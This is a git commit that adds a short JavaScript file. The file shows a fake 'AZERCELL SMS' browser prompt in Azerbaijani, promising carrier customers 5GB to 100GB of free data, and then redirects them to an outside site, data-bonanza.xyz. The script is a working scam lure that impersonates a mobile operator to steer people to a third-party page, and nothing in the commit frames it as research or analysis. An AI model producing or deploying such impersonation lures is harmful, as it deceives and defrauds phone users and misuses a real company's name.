46f25990e315fd255e8c88983d15bbab215b0dd7
infofest <ukpono82@gmail.com>
2025-03-13 22:07:11 -0700

    Create activation-azercell-freedata.js

---
+++ activation-azercell-freedata.js
@@ -0,0 +1,5 @@
+var password = 'Pulsuz Data'
+password=prompt('AZERCELL SMS: Hörmətli Müştəri, Zəhmət olmasa, Azercell Sim Kartınızın 5GB-dan 100GB-a qədər məlumat əldə etməyə uyğun olub-olmadığını yoxlayın, Köhnə Müştərilər Mükafatlandırın, İndi Yoxlamaq üçün Pulsuz Data basın ','Pulsuz Data');
+if (password != 'Pulsuz Data') {
+location.href='https://www.data-bonanza.xyz/azercell-freedata.html';
+}
